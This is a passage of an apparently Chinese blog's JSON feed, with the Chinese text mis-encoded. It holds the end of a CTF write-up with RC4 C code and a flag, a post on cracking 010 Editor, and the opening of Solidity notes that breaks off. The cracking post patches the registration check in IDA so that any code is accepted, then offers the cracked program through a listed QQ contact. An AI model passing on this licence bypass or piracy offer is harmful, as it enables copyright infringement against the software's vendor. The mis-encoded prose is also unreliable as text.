punctuation\">[</span><span class=\"token number\">27</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">86</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">28</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">120</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">29</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">58</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">30</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">49</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">31</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">46</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">32</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">73</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">33</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">90</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">34</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">63</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">35</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">66</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">36</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">80</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">37</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">12</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">38</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">72</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">39</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">55</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">40</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">11</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">41</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">44</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">42</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">11</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">43</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">88</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> datalen <span class=\"token operator\">=</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">;</span> <span class=\"token comment\">// å‡å»æœ«å°¾çš„ '\\0'</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>    <span class=\"token function\">rc4</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">,</span> keylen<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">,</span> datalen<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"åŠ å¯†åï¼š\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> datalen<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%02X \"</span><span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>    <span class=\"token comment\">//rc4(key, keylen, data, datalen);</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\nè§£å¯†åï¼š%s\"</span><span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>æœ€åè§‰å¾—ä¸‹æ¬¡ å…¶å®å¯ç›´æ¥å¤åˆ¶ IDA çš„ TAT</p>\n<p>DASCTF {03446c2c-dff7-11ed-9285-54e1ad98d649} æ³ªç›®</p>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>",
            "tags": [
                "ç¬”è®°"
            ]
        },
        {
            "id": "https://3cly.github.io/2023/06/18/%E7%A0%B4%E8%A7%A3010Editor/",
            "url": "https://3cly.github.io/2023/06/18/%E7%A0%B4%E8%A7%A3010Editor/",
            "title": "ç ´è§£010Editor",
            "date_published": "2023-06-18T07:29:00.000Z",
            "content_html": "<h1 id=\"ç ´è§£010editor\"><a class=\"markdownIt-Anchor\" href=\"#ç ´è§£010editor\">#</a> ç ´è§£ 010Editor</h1>\n<p>å…¨ç¨‹åœ¨è™šæ‹Ÿæœºä¸Šæ“ä½œ (å› ä¸ºä¸æƒ³å¸è½½ç‰©ç†æœºä¸Šçš„ 010)</p>\n<h2 id=\"å…ˆå®˜ç½‘ä¸‹è½½å®‰è£…\"><a class=\"markdownIt-Anchor\" href=\"#å…ˆå®˜ç½‘ä¸‹è½½å®‰è£…\">#</a> å…ˆå®˜ç½‘ä¸‹è½½å®‰è£…</h2>\n<p><img data-src=\"/images/image-20230618142557527.png\" alt=\"image-20230618142557527\"></p>\n<p><img data-src=\"/images/image-20230618144543522.png\" alt=\"image-20230618144543522\"></p>\n<h2 id=\"è¡Œä¸ºåˆ†æ\"><a class=\"markdownIt-Anchor\" href=\"#è¡Œä¸ºåˆ†æ\">#</a> è¡Œä¸ºåˆ†æ</h2>\n<p>å®‰è£…å®Œæœ‰ 30 è¯•ç”¨ &amp;&amp; éœ€è¦æ³¨å†Œ</p>\n<p><img data-src=\"/images/image-20230618144815615.png\" alt=\"image-20230618144815615\"></p>\n<p>ç JB å¡«ä¸€é€š æç¤ºé”™è¯¯</p>\n<p><img data-src=\"/images/image-20230618145014404.png\" alt=\"image-20230618145014404\"></p>\n<h2 id=\"idaæŸ¥çœ‹\"><a class=\"markdownIt-Anchor\" href=\"#idaæŸ¥çœ‹\">#</a> IDA æŸ¥çœ‹</h2>\n<p><img data-src=\"/images/image-20230618145940700.png\" alt=\"image-20230618145940700\"></p>\n<p>ç›´æ¥å¯¹ Invalid name å­—ç¬¦ä¸²è¿›è¡Œä¸€ä¸ªæŸ¥æ‰¾ å† X äº¤å‰å¼•ç”¨</p>\n<p><img data-src=\"/images/image-20230618150056848.png\" alt=\"image-20230618150056848\"></p>\n<p><img data-src=\"/images/image-20230618150240944.png\" alt=\"image-20230618150240944\"></p>\n<p>else å¾ˆæ˜æ˜¾ è¿™éƒ¨åˆ†éƒ½æ˜¯ä¸åŒçš„é”™è¯¯æ‰€å¯¹åº”çš„æŠ¥é”™ å‘ä¸Šæ‰¾åˆ° if æ³¨å†Œæ­£ç¡®</p>\n<p><img data-src=\"/images/image-20230618150547666.png\" alt=\"image-20230618150547666\"></p>\n<p>v26==219 æ˜¯å…³é”® é‚£å…³é”®å°±æ˜¯å‡½æ•° sub_140008693</p>\n<p><img data-src=\"/images/image-20230618150722583.png\" alt=\"image-20230618150722583\"></p>\n<p><img data-src=\"/images/image-20230618150917027.png\" alt=\"image-20230618150917027\"></p>\n<p>è¿™ä¸ªç»“æ„ å°±ç›´æ¥ ptach ä¿®æ”¹å°±è¡Œäº† è¿™é‡Œæˆ‘çš„æ€è·¯æ˜¯è®©ä»– return <s>v11 ç„¶å v11</s> çš„å€¼æ˜¯ 219</p>\n<p><img data-src=\"/images/image-20230618151942617.png\" alt=\"image-20230618151942617\"></p>\n<p><img data-src=\"/images/image-20230618152002418.png\" alt=\"image-20230618152002418\"></p>\n<p>è¿™ä¸‹ç›´æ¥ 219 äº†</p>\n<p><img data-src=\"/images/image-20230618152107546.png\" alt=\"image-20230618152107546\"></p>\n<p>Edit-&gt; åº”ç”¨ patch</p>\n<p><img data-src=\"/images/image-20230618152202785.png\" alt=\"image-20230618152202785\"></p>\n<p>æˆåŠŸ</p>\n<h2 id=\"ç ´è§£æˆåŠŸ\"><a class=\"markdownIt-Anchor\" href=\"#ç ´è§£æˆåŠŸ\">#</a> ç ´è§£æˆåŠŸï¼ï¼ï¼</h2>\n<p>ç›´æ¥æ³¨å†Œç çè¾“ä¸€é€š ç›´æ¥é€šè¿‡ï¼</p>\n<p><img data-src=\"/images/image-20230618152538959.png\" alt=\"image-20230618152538959\"></p>\n<h2 id=\"æ„Ÿæƒ³\"><a class=\"markdownIt-Anchor\" href=\"#æ„Ÿæƒ³\">#</a> æ„Ÿæƒ³</h2>\n<p>å¤ªç®€å•äº† æœ‰æ‰‹å°±è¡Œ æƒ³è¦ 010Editor ç ´è§£ç‰ˆç›´æ¥åŠ æˆ‘ QQ987623364</p>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>",
            "tags": [
                "ç¬”è®°"
            ]
        },
        {
            "id": "https://3cly.github.io/2023/05/28/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF%E4%B8%8E%E7%A0%94%E7%A9%B6%E8%BF%9B%E5%B1%95/",
            "url": "https://3cly.github.io/2023/05/28/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF%E4%B8%8E%E7%A0%94%E7%A9%B6%E8%BF%9B%E5%B1%95/",
            "title": "åŒºå—é“¾æŠ€æœ¯ä¸ç ”ç©¶è¿›å±•",
            "date_published": "2023-05-28T00:20:24.000Z",
            "content_html": "<h1 id=\"åŒºå—é“¾æŠ€æœ¯ä¸ç ”ç©¶è¿›å±•\"><a class=\"markdownIt-Anchor\" href=\"#åŒºå—é“¾æŠ€æœ¯ä¸ç ”ç©¶è¿›å±•\">#</a> åŒºå—é“¾æŠ€æœ¯ä¸ç ”ç©¶è¿›å±•</h1>\n<p><strong>åŒºå—é“¾æ™ºèƒ½åˆçº¦çš„ä¼˜ç‚¹</strong>ï¼šå»ä¸­å¿ƒåŒ– å¤šæ–¹éªŒè¯ éš¾ä»¥ç¯¡æ”¹</p>\n<h2 id=\"solidityè¯­è¨€\"><a class=\"markdownIt-Anchor\" href=\"#solidityè¯­è¨€\">#</a> <strong>Solidity è¯­è¨€</strong></h2>\n<p>Solidity æ˜¯ä¸€ç§ç”¨äºå®ç°æ™ºèƒ½åˆçº¦çš„é¢å‘å¯¹è±¡çš„é«˜çº§è¯­è¨€ã€‚Solidity è¯­æ³•æ¥è¿‘äº JavaScriptï¼Œä¸”æ˜¯ç›®å‰è¾ƒä¸ºæˆç†Ÿã€æµè¡Œçš„æ™ºèƒ½åˆçº¦è¯­è¨€</p>\n<h3 id=\"ç‰¹æ€§\"><a class=\"markdownIt-Anchor\" href=\"#ç‰¹æ€§\">#</a> ç‰¹æ€§</h3>\n<p>Solidity åœ¨åˆæœŸè®¾è®¡æ—¶çš„ç›®æ ‡æ˜¯ä¸ºäº†ç¼–å†™ä»¥å¤ªåŠä¸Šçš„æ™ºèƒ½åˆçº¦ï¼Œå› æ­¤æœ‰éƒ¨åˆ†è¯­æ³•ä¸ä»¥å¤ªåŠçš„å·¥ä½œåŸç†æ˜¯é«˜åº¦è€¦åˆçš„ã€‚Solidity ä¸­å…·æœ‰ä¸€äº›ç‰¹æ®Šç±»å‹ï¼ˆå¦‚ addressã€event ç­‰ï¼‰Solidity ä¸­å…·æœ‰ä¸€äº›ç‰¹æ®Šçš„å…³é”®å­—ï¼ˆå¦‚ payableã€now ç­‰ï¼‰Solidity éœ€è¦ç»“åˆä»¥å¤ªåŠæ™ºèƒ½åˆçº¦çš„ç‰¹æ€§åœ¨ç¼–å†™è¿‡ç¨‹ä¸­å¯¹å˜é‡è¿›è¡Œå…·ä½“å­˜å‚¨ä½ç½®çš„å®šä¹‰</p>\n<p>åœ¨çº¿ç¼–è¯‘å™¨ï¼š<span class=\"exturl\" data-url=\"aHR0cDovL3JlbWl4LmV0aGVyZXVtLm9yZy8lRTQlQjglQUQlRTYlOTYlODclRTYlOTYlODclRTYlQTElQTMlRUYlQkMlOUFodHRwczovL3NvbGlkaXR5LWNuLnJlYWR0aGVkb2NzLmlv\">http://remix.ethereum.org/ ä¸­æ–‡æ–‡æ¡£ï¼šhttps://solidity-cn.readthedocs.io</span></p>\n<h3 id=\"åŸºç¡€è¯­æ³•\"><a class=\"markdownIt-Anchor\" href=\"#åŸºç¡€è¯­æ³•\">#</a> åŸºç¡€è¯­æ³•</h3>\n<h4 id=\"å¸¸ç”¨ç±»å‹\"><a class=\"markdownIt-Anchor\" href=\"#å¸¸ç”¨ç±»å‹\">#</a> å¸¸ç”¨ç±»å‹</h4>\n<p><strong>å¸ƒå°”ç±»å‹</strong>ç”± bool å£°æ˜ï¼Œä¸ä¼ ç»Ÿç¼–ç¨‹è¯­è¨€ç±»ä¼¼ï¼Œå¯å– true æˆ–è€… falseã€‚</p>\n<p><strong>æ•´å‹</strong>ç”± int å£°æ˜æœ‰ç¬¦å·çš„æ•´å‹å˜é‡ï¼Œç”± uint å£°æ˜æ— ç¬¦å·çš„æ•´å‹å˜é‡ï¼Œå¯å–æ•´æ•°ã€‚å£°æ˜å˜é‡æ—¶åŠ ä¸Šæ•°å­—è¡¨ç¤ºå˜é‡çš„ä½æ•°ï¼Œå¦‚ int8 è¡¨ç¤º 8 ä½é•¿åº¦çš„æœ‰ç¬¦å·æ•´å‹å˜é‡ï¼Œä½æ•°å¯å– 8ã€16ã€â€¦â€¦ã€256ã€‚æœªå£°æ˜å˜é‡ä½æ•°æ—¶ï¼Œç¼–è¯‘å™¨åœ¨ç¼–è¯‘æ—¶å°†é»˜è®¤å…¶ä¸ºæœ€é•¿ä½æ•°ï¼Œå³å°† int ç¼–è¯‘ä¸º int256ã€‚</p>\n<p><strong>åœ°å€ç±»å‹</strong>ç”± address å£°æ˜ï¼ŒæŒ‡ä»¥å¤ªåŠè´¦æˆ·çš„åœ°å€ç±»å‹ï¼Œä¸ä»¥å¤ªåŠè´¦æˆ·é•¿åº¦ç›¸åŒï¼Œè¯¥ç±»å‹å®é™…ä¸ºå­˜å‚¨ä¸€ä¸ª 20 å­—èŠ‚çš„å€¼ã€‚åœ°å€ç±»å‹çš„å˜é‡å°†è‡ªå¸¦å¤šä¸ªæˆå‘˜å˜é‡ï¼Œå¯é€šè¿‡å¤šä¸ªæˆå‘˜å˜é‡å‡½æ•°è¿›è¡Œè´¦å·ä½™é¢è·å–ã€è·¨è´¦å·çš„è½¬è´¦ã€è°ƒç”¨ç­‰æ“ä½œã€‚</p>\n<p><strong>åœ°å€ç±»å‹</strong>æˆå‘˜å‡½æ•° balanceï¼šè·å–è¯¥åœ°å€ä½™é¢ï¼Œå¦‚<address>.balance (uint256)ï¼›transferï¼šå‘è¯¥åœ°å€è½¬è´¦ï¼Œå¤±è´¥åˆ™æŠ›å‡ºå¼‚å¸¸ï¼Œå¦‚<address>.transfer (uint256 amount)ï¼›sendï¼šå‘è¯¥åœ°å€è½¬è´¦ï¼Œå¤±è´¥åˆ™è¿”å› falseï¼Œå¦‚<address>.send (uint256 amount)ï¼›call/callcode/delegatecallï¼šå‘è¯¥åœ°å€å‘å‡ºç›¸åº”çš„åº•å±‚åˆçº¦è°ƒç”¨æ¶ˆæ¯ï¼Œå¦‚<address>.call(â€¦)</address></address></address></address></p>\n<p><strong>æ˜ å°„</strong>ç”± mapping (é”®ç±»å‹ =&gt; å€¼ç±»å‹) å£°æ˜é”®ç±»å‹ä¸å¯ä»¥æ˜¯ï¼šæ˜ å°„ã€å˜é•¿æ•°ç»„ã€åˆçº¦ã€æšä¸¾ä»¥åŠç»“æ„ä½“åœ¨æ˜ å°„å¯¹åº”çš„ä»¥å¤ªåŠçŠ¶æ€æ ‘åº•å±‚å­˜å‚¨ä¸­ï¼Œå®é™…ä¸Šå¹¶ä¸å­˜å‚¨é”®çš„å€¼ï¼Œè€Œæ˜¯å­˜å‚¨é”®çš„ keccak256 å“ˆå¸Œå€¼ï¼Œä»è€Œä¾¿äºå‡å°å­˜å‚¨ä½“ç§¯çš„åŒæ—¶æŸ¥è¯¢å®é™…çš„å€¼ã€‚ä¸æ•°ç»„ä¸åŒçš„æ˜¯ï¼Œæ˜ å°„æ²¡æœ‰é•¿åº¦ã€‚</p>\n<p><strong>ç»“æ„ä½“</strong>ç”± struct å£°æ˜ï¼Œå¯å°†å¤šä¸ªåŸºæœ¬å˜é‡ç»„åˆä¸ºä¸€ä¸ªç»“æ„</p>\n<p><strong>æŒ‡å®šå˜é‡çš„è®¿é—®</strong></p>\n<p>åœ¨å£°æ˜å˜é‡æ—¶ï¼Œåœ¨ç±»å‹ååï¼Œå¯ä»¥æŒ‡å®šå˜é‡ä¸º public æˆ– private å˜é‡æ˜¯å¦å¯ä»¥è¢«åˆçº¦çš„å¤–éƒ¨è°ƒç”¨è·å–æŸ¥è¯¢</p>\n<p><strong>æŒ‡å®šå˜é‡çš„å­˜å‚¨ä½ç½®</strong></p>\n<p>åœ¨å£°æ˜å˜é‡æ—¶ï¼Œåœ¨ç±»å‹ååï¼Œå¯ä»¥æŒ‡å®šå˜é‡çš„å­˜å‚¨ä½ç½®ä¸º storage æˆ– memory å˜é‡ä¿å­˜åœ¨å­˜å‚¨æˆ–æ˜¯å†…å­˜ä¸­ã€‚åŒæ ·å˜é‡çš„ä¸åŒå­˜å‚¨ä½ç½®æ¶‰åŠ Gas è®¡è´¹çš„ä¸åŒã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œå„ä¸ªå˜é‡æœ‰é»˜è®¤çš„å­˜å‚¨ä½ç½®ï¼Œå½“ç¼–è¯‘å™¨æ— æ³•é»˜è®¤è¯†åˆ«æ—¶ï¼Œä¼šæç¤ºå¼€å‘è€…è¿›è¡Œä¿®æ”¹ã€‚</p>\n<h5 id=\"ä¾‹å­\"><a class=\"markdownIt-Anchor\" href=\"#ä¾‹å­\">#</a> ä¾‹å­</h5>\n<figure class=\"highlight solidity\"><figcaption data-lang=\"Solidity (Ethereum)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// SPDX-License-Identifier: MIT</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token number\">0.6</span><span class=\"token number\">.0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">contract</span> <span class=\"token class-name\">Test1</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">struct</span> <span class=\"token class-name\">myStruct</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token builtin\">bool</span> myBool<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token builtin\">uint</span> myUint<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token builtin\">address</span> myAddress<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token builtin\">string</span> myString<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    myStruct<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">public</span> myArray<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">mapping</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token operator\">=></span><span class=\"token builtin\">string</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> myMapping<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        myStruct <span class=\"token keyword\">memory</span> myElement <span class=\"token operator\">=</span> <span class=\"token function\">myStruct</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span><span class=\"token string\">\"Hello\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        myArray<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span>myElement<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        myMapping<span class=\"token punctuation\">[</span><span class=\"token number\">10086</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token string\">\"World\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h6 id=\"æµ‹è¯•\"><a class=\"markdownIt-Anchor\" href=\"#æµ‹è¯•\">#</a> æµ‹è¯•</h6>\n<p><img data-src=\"/images/image-20230527132344158.png\" alt=\"image-20230527132344158\"></p>\n<h4 id=\"å‡½æ•°ç±»å‹\"><a class=\"markdownIt-Anchor\" href=\"#å‡½æ•°ç±»å‹\">#</a> å‡½æ•°ç±»å‹</h4>\n<p>å‡½æ•°çš„å£°æ˜ï¼šåœ¨ Solidity ä¸­ï¼Œå‡½æ•°é€šè¿‡ä»¥ä¸‹å½¢å¼è¿›è¡Œå£°æ˜ï¼š</p>\n<p public|private|internal|external>function (å‚æ•°)</p>\n<p>[pure|constant|view|payable] [returns (è¿”å›å€¼)]</p>\n<p>[] ä¸­çš„é€‰é¡¹ä¸ºå¯é€‰çš„å‡½æ•°ç±»å‹æè¿°ã€‚</p>\n<h4 id=\"ç‰¹æ®Šå˜é‡\"><a class=\"markdownIt-Anchor\" href=\"#ç‰¹æ®Šå˜é‡\">#</a> ç‰¹æ®Šå˜é‡</h4>\n<p><strong>ç‰¹æ®Šå˜é‡çš„ç”±æ¥</strong>ä»¥å¤ªåŠè™šæ‹Ÿæœºæä¾›äº†è·å–éƒ¨åˆ†åŒºå—é“¾ä¿¡æ¯çš„æ“ä½œç ï¼Œåœ¨ Solidity ä¸­ï¼Œç›¸å¯¹åº”åœ°ï¼Œä¹Ÿé¢„è®¾äº†ä¸€äº›ç‰¹æ®Šå˜é‡å’Œå‡½æ•°åœ¨ Remix ç¼–è¯‘å™¨ä¸­å¯å°è¯•å¾—åˆ°å„ä¸ªå˜é‡çš„è¿”å›å€¼</p>\n<p><strong>å¸¸ç”¨ç‰¹æ®Šå˜é‡</strong></p>\n<p>block.blockhash (åŒºå—å·å‚æ•°)ï¼šè¿‘ 256 ä¸ªåŒºå—å“ˆå¸Œï¼›</p>\n<p>block.coinbase: åˆçº¦äº¤æ˜“æ‰€å¤„åŒºå—çš„çŸ¿å·¥åœ°å€ï¼›</p>\n<p>block.difficulty: åˆçº¦äº¤æ˜“æ‰€å¤„åŒºå—çš„æŒ–çŸ¿éš¾åº¦ï¼›</p>\n<p>block.gaslimit: åˆçº¦äº¤æ˜“æ‰€å¤„åŒºå—çš„ gasLimitï¼›</p>\n<p>block.number: åˆçº¦äº¤æ˜“æ‰€å¤„åŒºå—çš„é«˜åº¦ï¼›</p>\n<p>block.timestamp: åˆçº¦äº¤æ˜“æ‰€å¤„åŒºå—çš„æ—¶é—´æˆ³ï¼›</p>\n<h4 id=\"äº‹ä»¶æ—¥å¿—\"><a class=\"markdownIt-Anchor\" href=\"#äº‹ä»¶æ—¥å¿—\">#</a> äº‹ä»¶æ—¥å¿—</h4>\n<p><strong>ä»¥å¤ªåŠäº‹ä»¶æ ‘</strong></p>\n<p>ä»¥å¤ªåŠé‡‡ç”¨äº†äº‹ä»¶æ—¥å¿—è¿›è¡Œè®°å½•ï¼Œæœ‰åˆ«äºçŠ¶æ€æ ‘ï¼Œäº‹ä»¶æ ‘æ˜¯å•å‘è¾“å‡ºã€ä¸å¯è¢«åˆçº¦è¯»å–çš„äº‹ä»¶æ ‘ä¸ºä¸Šå±‚åº”ç”¨æä¾›äº†é«˜æ•ˆçš„æŸ¥è¯¢æ–¹å¼ï¼Œä½¿å¾—ä¸Šå±‚åº”ç”¨èƒ½å¤Ÿè§‚å¯Ÿç‰¹å®šåˆçº¦çš„ç‰¹å®šåŠ¨ä½œçš„å‘ç”ŸåŠå…¶å†…å®¹</p>\n<h4 id=\"é”™è¯¯å¤„ç†\"><a class=\"markdownIt-Anchor\" href=\"#é”™è¯¯å¤„ç†\">#</a> é”™è¯¯å¤„ç†</h4>\n<p><strong>èƒŒæ™¯</strong></p>\n<p>ä¸ä¼ ç»Ÿè®¡ç®—æœºç¨‹åºç±»ä¼¼ï¼Œä»¥å¤ªåŠæ™ºèƒ½åˆçº¦çš„è¿è¡Œè¿‡ç¨‹ä¸­ï¼Œä¹Ÿå¯èƒ½å‡ºç°ç”±å¼€å‘è€…å®šä¹‰çš„å¼‚å¸¸æˆ–é”™è¯¯ï¼Œä¾‹å¦‚å‘èµ·äº¤æ˜“çš„åœ°å€ä¸å…·æœ‰è°ƒç”¨è¯¥å‡½æ•°çš„æƒé™ç­‰ã€‚å› æ­¤ï¼Œéœ€è¦å¯¹åˆçº¦è¿è¡Œä¸­çš„äº¤æ˜“è¿›è¡Œå¤„ç†ã€‚</p>\n<p><strong>ä»¥å¤ªåŠé”™è¯¯å¤„ç†</strong></p>\n<p>åœ¨ä»¥å¤ªåŠæ™ºèƒ½åˆçº¦ä¸­ï¼Œä¸€èˆ¬è€Œè¨€ï¼Œäº¤æ˜“åœ¨å‘ç”Ÿå¼‚å¸¸åï¼Œå…¶äº¤æ˜“ä¿®æ”¹çš„æ‰€æœ‰çŠ¶æ€éƒ½å°†è¢«å›æ»šã€éƒ½æ˜¯æ— æ•ˆçš„ã€‚</p>\n<p><strong>ä½çº§è°ƒç”¨å‡½æ•°äº§ç”Ÿå¼‚å¸¸</strong></p>\n<p>é€šè¿‡ Solidity 